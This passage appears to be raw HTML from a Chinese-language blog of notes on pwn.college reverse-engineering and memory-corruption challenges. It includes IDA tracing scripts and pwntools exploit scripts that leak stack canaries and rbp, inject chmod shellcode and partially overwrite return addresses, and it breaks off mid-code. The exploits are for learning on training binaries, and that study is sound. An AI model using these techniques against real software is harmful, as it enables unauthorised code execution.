class="hljs-keyword">auto</span> s1;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br>msg(<span class="hljs-string">&quot;\tPOP: %s=0x%x is %c, rsp=0x%x\n&quot;</span>, s1, RDX, RDX, RSI<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="STM"><a href="#STM" class="headerlink" title="STM:"></a>STM:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br>msg(<span class="hljs-string">&quot;\tSTM: *%s = %s\n&quot;</span>, s1, s2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="LDM"><a href="#LDM" class="headerlink" title="LDM:"></a>LDM:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br><span class="hljs-keyword">auto</span> mem = AL;<br>msg(<span class="hljs-string">&quot;\tLDM: %s = *(%s); mem:0x%x\n&quot;</span>, s1, s2, mem);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="CMP"><a href="#CMP" class="headerlink" title="CMP:"></a>CMP:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br><span class="hljs-keyword">auto</span> r1=get_wide_byte(RBP<span class="hljs-number">-0x2</span>);<br><span class="hljs-keyword">auto</span> r2=get_wide_byte(RBP<span class="hljs-number">-0x1</span>);<br>msg(<span class="hljs-string">&quot;\tCMP: %s:%s 0x%x:0x%x\n&quot;</span>, s1, s2, r1, r2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="print-all-regs"><a href="#print-all-regs" class="headerlink" title="print all regs:"></a>print all regs:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> r1=get_wide_byte(RDI+<span class="hljs-number">1024</span>);<br><span class="hljs-keyword">auto</span> r2=get_wide_byte(RDI+<span class="hljs-number">1025</span>);<br><span class="hljs-keyword">auto</span> r3=get_wide_byte(RDI+<span class="hljs-number">1026</span>);<br><span class="hljs-keyword">auto</span> r4=get_wide_byte(RDI+<span class="hljs-number">1027</span>);<br><span class="hljs-keyword">auto</span> r5=get_wide_byte(RDI+<span class="hljs-number">1028</span>);<br><span class="hljs-keyword">auto</span> r6=get_wide_byte(RDI+<span class="hljs-number">1029</span>);<br><span class="hljs-keyword">auto</span> r7=get_wide_byte(RDI+<span class="hljs-number">1030</span>);<br><br>msg(<span class="hljs-string">&quot;\t    [V] r1:0x%x r2:0x%x r3:0x%x r4:0x%x r5:0x%x r6:0x%x r7:0x%x\n&quot;</span>, r1,r2,r3,r4,r5,r6,r7);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><p>设置完之后就会出现非常漂亮的一个输出, 不过很长, 而且这种输出是会跟着程序流变化的, 不利于整体上的静态分析. 下次尝试避开所有跳转, 按顺序打印出所有的代码, 不然跳来跳去的真的很难看.</p><p>结果就是简单的判断字符串相等, 总共9字节. 都在log文件里.</p><h3 id="level17-1"><a href="#level17-1" class="headerlink" title="level17"></a>level17</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">32</span>) s1 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">16</span>) s1 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">1</span>) s1 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">4</span>) s1 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">64</span>) s1 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">8</span>) s1 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br><span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">32</span>) s2 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">16</span>) s2 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">1</span>) s2 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">4</span>) s2 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">64</span>) s2 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">8</span>) s2 = <span class="hljs-string">&quot;r7&quot;</span>;<br></code></pre></div></td></tr></table></figure><p>先跳过, 感觉就是复杂度的堆积, 又或者是我方向错了. 到时回来看.</p><h3 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h3><p>Yan85 shellcoding. 直接做<code>.0</code>题目, 省点事.</p><p>输入<code>0x300uLL</code>字节的bytecode, 前768字节是指令最多256条, 后面是内存空间, 再后面是寄存器.</p><p>完全由我控制的话首先是往内存中放入/flag字符串, 然后open(path in memory) -&gt; read to memory -&gt; write to stdout. 再结合一下题目里的寄存器, 操作数和顺序就行. 估计得写个python函数自动生成.</p><h3 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h3><p>更特别了. 主要是这个<code>rerandomize()</code>函数, 其中寄存器, 指令, 系统调用, cmp标志位全部都是随机的. 随机的方法是8个int8随机选取两个进行交换, 执行65535次.</p><p>难道是在变化中找到不变的东西?</p><p>噢虽然是随机的但是由于rand的特点(种子和flag有关), 每次的值都不会变, 这样子只要编写一些logic去brute force一些指令和值就可以了.</p><h1 id="module-8-exp"><a href="#module-8-exp" class="headerlink" title="module 8-exp"></a>module 8-exp</h1><ul><li>时至2022年4月22日, c语言排名<a href="https://www.tiobe.com/tiobe-index/">第二位</a>, 历史最低为第二位. 大部分逆向工具反编译出的结果都是类C语言, 因为c语言是最接近汇编的语言, 还给了开发者一种使用高级语言而不是直接通过汇编去操作寄存器的选择, 被大量使用在操作系统和其他软件的代码中. 而c语言的内存完全控制所带来的问题在near future不会消失, 比如说一些嵌入式设备需要c语言来开发等等.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = gdb.debug(<span class="hljs-string">&#x27;./balabala&#x27;</span>)<br>test_string = cyclic(<span class="hljs-number">128</span>) <span class="hljs-comment"># used to identify the location of overflow string</span><br>cyclic_find(<span class="hljs-string">&quot;gaaa&quot;</span>)<br></code></pre></div></td></tr></table></figure><ul><li><p>stack canary mitigations:</p><ul><li><p><strong>leak the canary.</strong> </p></li><li><p><strong>brute-force the canary(for forking processes)</strong> </p></li><li><p><strong>modify the canary.</strong>  </p></li><li><p>by forking processes, it can test repeatedly and figure out what the canary is.</p></li><li><p>the canary begins with null-byte.</p></li></ul></li><li><p>alsr mitigation:</p><ul><li>because all segments are aligned to 0x1000, so changing the least significant byte in a pointer can redirect the flow to another position.</li><li><code>setarch x86_64 -R /bin/zsh</code> command</li></ul></li><li><p>uninitilized data.</p><ul><li>but gcc with high level optimization will probably remove the memset function, as it seems to be pointless.</li></ul></li></ul><hr><ul><li>整了pwndbg+tmux的组合视图, 感觉, 有一点点点点用吧…<p hidden>我是真有精力搞这个…</p>成功在tmux里面套娃screen.</li><li>使用gdb加上core文件 <a href="https://stackoverflow.com/questions/8305866/">stackoverflow</a> <ul><li><strong>ulimit -c unlimited</strong> : 解除core dump文件大小限制, 或者直接加在zshrc里面.</li><li>然后<code>gdb-pwndbg [filename] [coredump]</code> </li><li>视频中使用了cyclic加上gdb core来查看返回地址从而发现buf的溢出位置.</li><li>也可以使用valgrind, 不过参数较多.</li><li>pwn也有coredump函数.</li></ul></li></ul><h4 id="level1-2"><a href="#level1-2" class="headerlink" title="level1-2"></a>level1-2</h4><p>简单的忘记了</p><h4 id="level3-4"><a href="#level3-4" class="headerlink" title="level3-4"></a>level3-4</h4><p>修改返回地址. </p><h4 id="level5-2"><a href="#level5-2" class="headerlink" title="level5"></a>level5</h4><p>gdb 调试出现问题, read一个大数字就会bad address, 直接执行没有出现….</p><h4 id="level6-2"><a href="#level6-2" class="headerlink" title="level6"></a>level6</h4><p>重复利用堆栈, 修改返回地址后顺手改写rbp+0x4开始的四字节为0x1337(4919)</p><p>challenge堆栈有没有实用的位置, 应该就是对齐.</p><p>发现没啥特别的, 就是固定0x40000地址, 然后跳过win_auth的验证条件直接执行read flag</p><h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7"></a>level7</h4><p>和rev的18题差不多, 但是Yan85的open syscall被禁用. 他说有个memory error, 在哪里呢.</p><p>保护全关, 可执行栈. 根本没有open这个libc函数, 需要hijack shellcode, 注入到哪里呢? </p><p>发现了, 一个read到栈空间的调用没有检查边界:</p><img src="../../image/pwn-modules/image-20220503162403150.png" alt="image-20220503162403150" style="zoom:80%;" /><ul><li>不过要注意r2和r3只有1字节, 最多就是256. </li><li>反正各种保护都没开, 可以直接定位shellcode的位置. 总共长36字节.</li><li>shellcode得调用syscall, 还是用chmod简单点, shellcode就加在一开始的byte code中. 对shellcode进行Yan85译码可能会出问题, 在byte code结束之前还要修改r6的值来直接跳到指令的末尾.</li><li>Yan85 code直接从memory[1024]开始, 覆盖8B register, 9B stack space, 8B saved rbp, and finally, the <code>retaddr</code> to the position of shellcode. <ul><li>还有一些细节, 覆盖r6的时候可以直接修改成256在下一次译码结束执行, 这样子就不用多余的操作修改r6.</li></ul></li></ul><h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8"></a>level8</h4><p>这题在上一题的基础之上加了canary和PIE.</p><p>其余部分应该是一样的, 溢出点也是一样的. 对了, write函数也没有边界检查, 可以利用这个来leak出canary和rbp.</p><h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9"></a>level9</h4><p>保护半开, 可用open, <strong>disallowed read_code</strong>, no bundary check in read, but write has.</p><p>只允许byte code中出现一次syscall.</p><p>但是发现read_memory的目的地变成了指令的区域. 于是就可以使用这个调用来输入新的代码去覆盖旧的.</p><h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10"></a>level10</h4><p>这次在上一题的基础上补上了read_memory的错误, 仍然只能用用一次syscall. <strong>边界检查全开</strong>.</p><p>这???</p><h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11"></a>level11</h4><p>JIT pray, Yan85_64, 保护全开, 全新逻辑, 暂且放弃.</p><h1 id="module-9-mem"><a href="#module-9-mem" class="headerlink" title="module 9-mem"></a>module 9-mem</h1><p>nothing special.</p><h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>canary disabled.</p><p>inject shellcode to a map region, and then overwrite return address to jmp to executing shellcode.</p><h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p>保护全关. 可执行栈. 确实没有什么东西, 没开PIE的话栈的位置都是一样的, shellcode注入的地点也可以使用绝对地址来确定.</p><h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h4><img src="../../image/pwn-modules/image-20220430102917561.png" alt="image-20220430102917561" style="zoom:80%;" /><p>栈上的地址最低12位都是随机的. 怕不是每次运行的时候_start和__libc_start_main函数都会用到不同的栈空间大小…也许是aslr把stackbase也改了.<br>这下子只能连rbp都给leak出来了.</p><ol><li>first exec <code>challenge</code> to <strong>leak canary</strong> and inject <strong>shellcode</strong>.</li><li>second exec to leak first challenge’s <strong>rbp</strong>, and then calc the shellcode position.</li><li>third exec to jmp to shellcode.</li></ol><p><del>不对, 第一次leak canary的时候也可以leak出main的rbp,</del> 没事了, main的rbp可以用但没必要.</p><ul><li>没有push imm64这条指令.</li><li>一开始用chmod+.ascii “flag”的做法, 发现自己加了一个空字符, 只能通过栈来尝试. 想了想, 栈指针加8也不会对第一个challenge的栈帧造成什么影响. 换成下面这个, 注意小端法.<br><code>[hex(ord(character)) for character in &#39;/flag&#39;] =&gt; [&#39;0x2f&#39;, &#39;0x66&#39;, &#39;0x6c&#39;, &#39;0x61&#39;, &#39;0x67&#39;]</code> </li><li>没料到手写shellcode会有一堆的空字符. 放弃手写, 转为pwntool生成.</li><li>size写太大, REPEAT后面的换行符都给读进去了.</li><li>招架不住canary和rbp里面也有空字符…多试几次就行了</li><li>IDA变量定义错了, 存在一个指向字符数组的指针, read参数还出现了对buf的解引用, 半天没看出来.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#buf在rbp-0x38的位置, canary在rbp-0x8</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#binary = glob(&quot;/challenge/t*&quot;)[0]</span><br>binary = <span class="hljs-string">&quot;./toddlerone_level3.1.elf64&quot;</span><br>context.binary = binary<br>p = process(binary) <br><br><span class="hljs-comment">#第一次leak canary</span><br>p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;57&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;bytes)!\n&quot;</span>)<br>shellcode=shellcraft.amd64.chmod(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;0x04&#x27;</span>)<br>payload = asm(shellcode) <br>payload = payload.ljust(<span class="hljs-number">0x40</span>-<span class="hljs-number">8</span>-<span class="hljs-number">6</span>+<span class="hljs-number">1</span>)<br>payload += <span class="hljs-string">b&#x27;REPEAT&#x27;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>canary = p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;canary&#x27;</span>+canary)<br><br><span class="hljs-comment">#第二次leak rbp</span><br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-string">b&#x27;64&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;REPEAT&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>rbp_byte = p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>rbp = <span class="hljs-built_in">int</span>.from_bytes(rbp_byte, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;rbp = &#x27;</span>+<span class="hljs-built_in">hex</span>(rbp))<br><br><span class="hljs-comment">#第三次执行shellcode.</span><br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-string">b&#x27;200&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x38</span>+canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(rbp-<span class="hljs-number">0x40</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br></code></pre></div></td></tr></table></figure><h4 id="level4-2"><a href="#level4-2" class="headerlink" title="level4"></a>level4</h4><p>看起来和上一题没有什么区别, 就是88字节的数组末尾8字节要是一个确定的数字才能正常return.</p><p>%s没有限制. executable stack.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#几乎一样的代码, 不打出来了.</span><br></code></pre></div></td></tr></table></figure><h4 id="level5-3"><a href="#level5-3" class="headerlink" title="level5"></a>level5</h4><p>else repeat加了一个seccomp, 感觉又没什么区别.</p><h4 id="level6-3"><a href="#level6-3" class="headerlink" title="level6"></a>level6</h4><p>这下子真有区别了, seccomp在challenge返回的时候无法避免. 保护一样, 仍然是可执行栈.</p><p>只允许write和exit_group. 这是能做的吗? 一次load剩下的执行流程都会被限制.</p><p>没事了, 我连他的限制的内容也可以修改. 改成我想要的就行了. 总共允许两个syscall.</p><p>改成90 chmod 91 fchmod就行.</p><h4 id="level7-2"><a href="#level7-2" class="headerlink" title="level7"></a>level7</h4><p>加上了PIE. 利用随机地址仍然是4KB对齐来修改最后两个字节, 不过最高四位只能碰运气了(\x29中的’2’)</p><ul><li>使用vim编辑二进制文件直接把非print字符整成一个问号存起来……换个办法修改好了…..</li><li>要么使用编辑器, 要么vim中使用<code>set binary</code>或<code>-b</code>参数, 然后<code>%!xxd</code> </li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x68</span> + <span class="hljs-string">b&#x27;\xa4\x29&#x27;</span><br></code></pre></div></td></tr></table></figure><h4 id="level8-2"><a href="#level8-2" class="headerlink" title="level8"></a>level8</h4><p>heap上malloc一个size区域, 七八十字节, 但是在这个区域中使用strlen, 在一堆ped中加入一个空字符即可. </p><p>而且加了PIE. 如同上一题的做法.</p><h4 id="level9-2"><a href="#level9-2" class="headerlink" title="level9"></a>level9</h4><p>保护全开. <a href="https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro">RELRO</a> </p><p>最大的问题是开了canary.</p><p>嘶—-我知道了, 利用内存寻址可以跳过canary从而直接修改retaddr.</p><p>0x79下一个是0x80也是很可以. 下次写十六进制一定加前缀.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">92</span>+<span class="hljs-string">b&#x27;\x77\x1a\x3f&#x27;</span><br></code></pre></div></td></tr></table></figure><h4 id="level10-2"><a href="#level10-2" class="headerlink" title="level10"></a>level10</h4><p>已经将flag读到了栈上, 为了printf的%s能够打印出来, 把buf前面110个字节填充为非零, 紧接着就是flag内容, 这样%s的打印就不会在110处停止.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">110</span><br></code></pre></div></td></tr></table></figure><h4 id="level11-2"><a href="#level11-2" class="headerlink" title="level11"></a>level11</h4><p>保护全开, 这题是mmap的使用, 以前还没看过详细的机制. youtube的一个<a href="https://www.youtube.com/watch?v=8hVLcyBkSXY">视频</a>, 还不错.</p><p>一连几个mmap都是没有address hint的, 全都连在一起. 而且是向低地址方向map,  最后map的region反而在低地址.</p><img src="../../image/pwn-modules/image-20220426223702228.png" alt="image-20220426223702228" style="zoom:80%;" /><p>最后的map只指定了0x5c个字节, 不过还是分配了0x1000一整个page, 全为可写可读. <strong>没搞懂的是为什么/flag映射的是只能执行也可以被printf读取出来</strong>..</p><p>所以结果也很简单, 0x3000字节即可.</p><h4 id="level12-1"><a href="#level12-1" class="headerlink" title="level12"></a>level12</h4><p>仍然是全开.</p><p>能重复执行challenge, 难不成是leak canary? 而且还有printf %s.</p><ul><li>第一次0x19个(因为buf和canary之间有undefined区域)填充字符, leak出canary, 然后再次进入challenge</li><li>为了能跳转到win, 必须执行完challenge, 即通过canary验证. 第一次执行覆盖了canary第一字节必定不成功, 第二次利用leak出的canary来通过验证并且修改返回地址的低两字节.</li><li>这么一说感觉得用pwntools来写了.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    p = process(<span class="hljs-string">&#x27;./babymem_level12.1.elf64&#x27;</span>)<br><br>    p.sendline(<span class="hljs-string">b&#x27;25&#x27;</span>)<br>    pl = <span class="hljs-string">b&#x27;REPEAT&#x27;</span>.rjust(<span class="hljs-number">0x20</span>-<span class="hljs-number">8</span>+<span class="hljs-number">1</span>)<br>    p.sendline(pl)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>    canary = p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(canary)<br>    p.sendline(<span class="hljs-string">b&#x27;42&#x27;</span>)<br>    pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;\xa4\x23&#x27;</span><br>    p.sendline(pl)                             <br><br>    <span class="hljs-built_in">all</span> = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">all</span>)<br>        <span class="hljs-keyword">break</span><span class="hljs-comment">#一直试到成功为止.</span><br>    <span class="hljs-comment">#break</span><br></code></pre></div></td></tr></table></figure><h4 id="level13-1"><a href="#level13-1" class="headerlink" title="level13"></a>level13</h4><p>大满开!</p><p>重复利用没有清空的堆栈内容. flag在<code>rbp-0x10f</code>开始的0x100字节上. 所以在challenge栈帧中也从这个位置读取即可. 神奇的是有一大块空间没有被定义. 或许是定义了一个数组然后没有使用? 这样的话还不能被编译器优化掉.</p><p>v5从rbp-0x120开始, 填上0x20 byte is enough.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">17</span>                                                    <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/mnt/hgfs/LearingList/pwn.college/input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(<span class="hljs-string">b&#x27;17\n&#x27;</span>+pl)<br></code></pre></div></td></tr></table></figure><h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><p>也是leak canary, the problem is printf() function limit the number of bytes to be output to 452, while buf size if 456 bytes. </p><p>………….</p><h4 id="level15-1"><a href="#level15-1" class="headerlink" title="level15"></a>level15</h4><p>TCP连接, 利用fork的特点来绕过canary.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">tcp_socket = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>udp_socket = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);<br>raw_socket = socket(AF_INET, SOCK_RAW, protocol);<br></code></pre></div></td></tr></table></figure><ul><li><a href="https://docs.pwntools.com/en/stable/tubes/sockets.html">https://docs.pwntools.com/en/stable/tubes/sockets.html</a>, exempli gratia:</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 